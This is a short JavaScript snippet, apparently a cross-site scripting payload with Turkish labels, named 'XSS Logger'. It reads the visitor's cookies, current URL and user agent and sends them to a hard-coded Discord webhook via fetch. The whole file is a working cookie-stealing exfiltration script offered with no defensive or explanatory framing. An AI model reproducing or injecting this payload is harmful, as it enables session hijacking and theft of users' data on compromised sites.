
const data = {
  cookie: document.cookie,
  location: window.location.href,
  userAgent: navigator.userAgent
};
const webhookURL = "https://discord.com/api/webhooks/1394074771737542677/uRMsLtGKB__hpo50sbLBSfjO7ltpq5b7qtvR1IO1K24qNCxhQlYdlmxKbBhULgt9Jljj";

const payload = {
  username: "XSS Logger",
  avatar_url: "https://i.imgur.com/3ZQ3Z8y.png", // isteğe bağlı
  content: `📡 Yeni XSS Logu:\n\`\`\`\nCookie: ${data.cookie}\nURL: ${data.location}\nAgent: ${data.userAgent}\n\`\`\``
};
fetch(webhookURL, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify(payload)
});
